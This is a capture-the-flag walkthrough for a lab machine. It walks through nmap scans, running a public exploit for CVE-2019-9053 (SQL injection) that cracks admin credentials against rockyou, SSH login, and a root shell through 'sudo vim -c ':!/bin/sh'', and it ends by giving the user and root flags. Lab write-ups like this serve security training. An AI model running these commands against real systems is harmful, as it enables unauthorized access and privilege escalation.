### How many services are running under port 1000?
```BASH
nmap -sV -p1-1000 VICTIM_IP_ADRESS
```
`-sV` - determine service/version info  

`-p1-1000` - strictly ports 1 to 1000  

![image](https://github.com/user-attachments/assets/a564f521-f758-4386-8b7e-fdf302a5033d)
<pre>2</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What is running on the higher port?
```BASH
nmap -sV -p- VICTIM_IP_ADRESS
```
![image](https://github.com/user-attachments/assets/83e955f4-0545-4867-b272-1641190e728c)

`-p-` - scan all ports
<pre>ssh</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What's the CVE you're using against the application?
<pre>CVE-2019-9053</pre>

<span style="line-height:0.5;">&nbsp;</span>

### To what kind of vulnerability is the application vulnerable?
<pre>SQLi</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What's the password?
Download the Python exploit from [exploit-db](https://www.exploit-db.com/exploits/46635) and save it as exploit.py. Run the exploit with cracking enabled.
```BASH
python2 exploit.py -u http://VICTIM_IP_ADRESS/simple --crack -w /usr/share/wordlists/rockyou.txt
```
The script will extract and crack the admin credentials: 

![image](https://github.com/user-attachments/assets/1887f377-bd6a-4fc2-ad81-c1ceea2b7463)

<span style="line-height:0.5;">&nbsp;</span>

### Where can you login with the details obtained?
<pre>ssh</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What's the user flag?
```BASH
ssh mitch@VICTIM_IP_ADRESS -p 2222
```
![image](https://github.com/user-attachments/assets/79ea498b-ab33-4b45-83f8-da8ef18a8dcf)
<pre>G00d j0b, keep up!</pre>

<span style="line-height:0.5;">&nbsp;</span>

### Is there any other user in the home directory? What's its name?
```BASH
cd ..
ls
```
<pre>sunbath</pre>
<span style="line-height:0.5;">&nbsp;</span>

### What can you leverage to spawn a privileged shell?
Run the following command to check sudo permissions.
```BASH
sudo -l
```
![image](https://github.com/user-attachments/assets/d0586f88-c5ac-4e2d-ab21-b0fc2ad6dfaa)  

This means user mitch can execute vim as root without a password.
<pre>vim</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What's the root flag?
To escalate privileges using vim, go to [GTFOBins](https://gtfobins.github.io/) and search vim. Go to the 'Sudo' section, and if you can run vim as root via sudo, spawn a root shell by running:
```BASH
sudo vim -c ':!/bin/sh'
```
This command opens vim and immediately executes `/bin/sh` from within it, giving you a root shell. Exit Vim to open root shell.  

![image](https://github.com/user-attachments/assets/ac6c31d0-bea6-4468-8ec8-5fc75421bde2)

CTF flag
<pre>W3ll d0n3. You made it!</pre>

